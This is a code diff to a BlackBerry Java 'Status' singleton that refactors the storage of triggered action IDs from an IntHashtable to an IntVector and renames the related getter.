@@ -17,6 +17,7 @@ import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.IntHashtable;
+import net.rim.device.api.util.IntVector;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
 import blackberry.agent.CrisisAgent;
@@ -92,8 +93,9 @@ public final class Status implements Singleton {
     /** The crisis. */
     private boolean crisis = false;
 
-    IntHashtable triggeredAction = new IntHashtable();
-
+    //IntHashtable triggeredAction = new IntHashtable();
+    IntVector triggeredActions = new IntVector();
+    
     public boolean synced;
     public boolean gprs;
     public boolean wifi;
@@ -584,7 +586,7 @@ public final class Status implements Singleton {
      * 
      * @return the action id triggered
      */
-    public int[] getActionIdTriggered() {
+    public int[] getActionIdsTriggered() {
         //#ifdef OPTIMIZE_TASK
         try {
             synchronized (triggeredSemaphore) {
@@ -596,12 +598,10 @@ public final class Status implements Singleton {
         //#endif
         
         synchronized (lockTriggerAction) {
-            final int size = triggeredAction.size();
-            final int[] keys = new int[size];
-            if (size > 0) {
-                triggeredAction.keysToArray(keys);
-            }
-            return keys;
+            int[] ids = new int[triggeredActions.size()];
+            triggeredActions.copyInto(ids);
+            return ids;
+         
         }
     }
 
@@ -613,8 +613,8 @@ public final class Status implements Singleton {
      */
     public void removeActionTriggered(final Action action) {
         synchronized (lockTriggerAction) {
-            if (triggeredAction.containsKey(action.actionId)) {
-                triggeredAction.remove(action.actionId);
+            if(triggeredActions.contains(action.actionId)){
+                triggeredActions.removeElement(action.actionId);
             }
         }
 
@@ -657,7 +657,6 @@ public final class Status implements Singleton {
             //#endif
             return false;
         }
-
     }
 
     /**
@@ -668,8 +667,9 @@ public final class Status implements Singleton {
      */
     public void addActionTriggered(final Action action) {
         synchronized (lockTriggerAction) {
-            if (!triggeredAction.containsKey(action.actionId)) {
-                triggeredAction.put(action.actionId, action);
+            
+            if (!triggeredActions.contains(action.actionId)) {
+                triggeredActions.addElement(action.actionId);
             }
         }
         //#ifdef OPTIMIZE_TASK
@@ -681,7 +681,7 @@ public final class Status implements Singleton {
 
     public void unTriggerAll() {
         synchronized (lockTriggerAction) {
-            triggeredAction.clear();
+            triggeredActions.removeAllElements();
         }
 
         //#ifdef OPTIMIZE_TASK
